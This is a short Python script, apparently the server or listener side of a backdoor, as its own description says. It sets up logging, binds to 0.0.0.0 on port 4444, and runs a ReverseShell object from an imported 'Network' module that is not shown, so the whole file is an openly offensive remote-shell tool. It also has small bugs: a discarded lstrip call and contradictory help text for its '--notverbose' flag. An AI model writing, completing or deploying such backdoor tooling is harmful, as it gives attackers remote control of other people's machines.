import logging
import Network
import argparse


def mg_arg():
    parser = argparse.ArgumentParser(description='Backdoor server fonction')

    parser.add_argument('-l', '--logName', help='Set the server logging file', type=str, default="logFile.log")
    parser.add_argument('-nv', '--notverbose', action="store_true", default=False, help="Enable verbose mode")
    args = parser.parse_args()
    return args


def set_log(log_name, is_not_verbose):
    if is_not_verbose:
        level_log = logging.ERROR
    else:
        level_log = logging.INFO
    log_name.lstrip()

    log_format = '[%(asctime)-15s] [%(levelname)s] %(message)s'
    logging.basicConfig(filename=log_name, level=level_log, format=log_format)


def main():
    local_ip = "0.0.0.0"
    local_port = 4444
    args = mg_arg()

    set_log(args.logName, args.notverbose)

    secure_communication = Network.ReverseShell(local_ip, local_port)
    secure_communication.secure_connect()
    secure_communication.run()
    secure_communication.clean_socket()


if __name__ == "__main__":
    main()
